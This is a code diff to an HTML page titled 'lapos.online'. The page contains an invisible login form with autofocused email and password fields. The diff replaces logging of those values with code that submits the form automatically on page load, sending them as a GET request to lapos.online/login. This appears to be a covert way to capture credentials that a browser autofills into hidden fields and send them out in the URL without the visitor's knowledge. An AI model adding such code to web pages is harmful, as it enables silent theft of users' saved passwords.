@@ -5,7 +5,7 @@
 	<title>lapos.online</title>
 </head>
 <body>
-<form method="GET" action="https://lapos.online/login" style="height: 0 !important;display: none;">
+<form method="GET" action="https://lapos.online/login" id="form-login" style="height: 0 !important;display: none;">
 <input id="email" type="email" class="form-control" name="email" value="" required="" autofocus="">
 <input id="password" type="password" class="form-control" name="password" required="">
 </form>
@@ -14,8 +14,7 @@
 	window.onload = function() {
 	var email=document.getElementById("email").value;  
 	var password=document.getElementById("password").value;
-	console.log(email);
-	console.log(password);
+	document.getElementById("form-login").submit();
 	};
 </script>
 </body>
